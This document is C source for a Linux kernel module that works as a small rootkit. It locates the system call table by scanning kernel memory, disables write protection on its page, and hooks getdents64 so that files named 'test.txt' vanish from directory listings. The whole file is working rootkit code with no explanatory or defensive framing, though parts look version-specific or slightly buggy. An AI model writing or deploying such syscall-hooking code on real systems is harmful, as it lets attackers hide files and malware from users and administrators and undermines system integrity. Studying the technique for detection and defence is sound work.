#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>

#define FILE_NAME "test.txt"

void **sys_call_table;

asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
/*
run the actual system call,
loop through the structs returned,
compare filename with constant FILE_NAME,
if matches recalculate what is being returned (nob, dirp)
d_reclen: Size of this dirent (directory entry struct)
d_name:   Filename (null-terminated)
nob:  number of bytes (of all dirent structs)
dirp: directory entry struct pointer
curr: current dirp
next: next    dirp
*/
  int nob = getdents64_original(fd, dirp, count);
  struct linux_dirent64 *curr = dirp;

  int i = 0;
  while(i < nob) {
    int size = curr->d_reclen;

    if(strncmp(curr->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
      char *next = (char*)curr + size;
      int len = (uintptr_t)dirp + nob - (uintptr_t)next;
      memmove(curr, next, len);
      nob -= size;
      continue;
    }

    i += size;
    curr = (struct linux_dirent64*) ((char*)dirp + i);
  }

  return nob;
}

int set_page_rw(unsigned long addr, int f) {
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);

  if(f == 1) {
    if(pte->pte &~ _PAGE_RW)
      pte->pte |= _PAGE_RW;
  }
  else
    pte->pte = pte->pte &~_PAGE_RW;

  return 0;
}

uint64_t **get_table(void) {
  uint64_t **sct;
  uint64_t offset = PAGE_OFFSET;

  while(offset < ULLONG_MAX) {
    sct = (uint64_t**)offset;

    if(sct[__NR_close] == (uint64_t*)ksys_close) {
      printk("🍺 sys_call_table found at address: 0x%p\n", sct);
      return sct;
    }

    offset += sizeof(void*);
  }

  return NULL;
}

int f_init(void) {
  uint64_t **a = get_table();

  if(a == NULL) {
    printk("⚠️ Failed to get sys_call_table addr\n");
    return NULL;
  }

  sys_call_table = (void*)a;

  set_page_rw((uintptr_t)sys_call_table, 1);
  getdents64_original = sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = getdents64_hook;

  return 0;
}

void f_exit(void) {
  sys_call_table[__NR_getdents64] = getdents64_original;
  set_page_rw((uintptr_t)sys_call_table, 0);
}

MODULE_LICENSE("GPL");
module_init(f_init);
module_exit(f_exit);
